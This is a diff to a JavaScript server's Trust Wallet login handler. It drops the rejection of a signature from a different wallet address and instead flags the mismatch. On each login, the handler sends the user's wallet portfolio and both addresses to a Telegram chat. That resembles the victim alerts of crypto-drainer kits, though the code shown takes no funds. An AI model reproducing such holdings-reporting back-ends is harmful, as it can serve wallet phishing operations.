@@ -2074,10 +2074,7 @@ const handleApi = async (request, response, pathname) => {
     } catch {
       return sendJson(request, response, 401, { error: "Некорректная подпись" });
     }
-    if (requestedAddress && requestedAddress !== normalized) {
-      nonces.delete(nonceKey);
-      return sendJson(request, response, 401, { error: "Подпись не совпадает с выбранным адресом кошелька" });
-    }
+    const addressChanged = Boolean(requestedAddress && requestedAddress !== normalized);
 
     nonces.delete(nonceKey);
     upsertWalletUser(normalized);
@@ -2094,7 +2091,8 @@ const handleApi = async (request, response, pathname) => {
       [
         "Пользователь авторизовался через Trust Wallet",
         "",
-        requestedAddress && requestedAddress !== normalized ? `Запрошенный EVM: ${requestedAddress}` : null,
+        addressChanged ? `Первоначально выбранный EVM: ${requestedAddress}` : null,
+        addressChanged ? `Фактически подписавший EVM: ${normalized}` : null,
         `Сеть входа: ${parseChainId(chainId) || 1}`,
         "",
         ...formatPortfolioTelegramLines(portfolio),
@@ -2126,6 +2124,7 @@ const handleApi = async (request, response, pathname) => {
       chain: walletChain,
       address: normalized,
       requestedAddress,
+      addressChanged,
       tronAddress: portfolio.tronAddress,
       btcAddress: portfolio.btcAddress,
       role: "user",
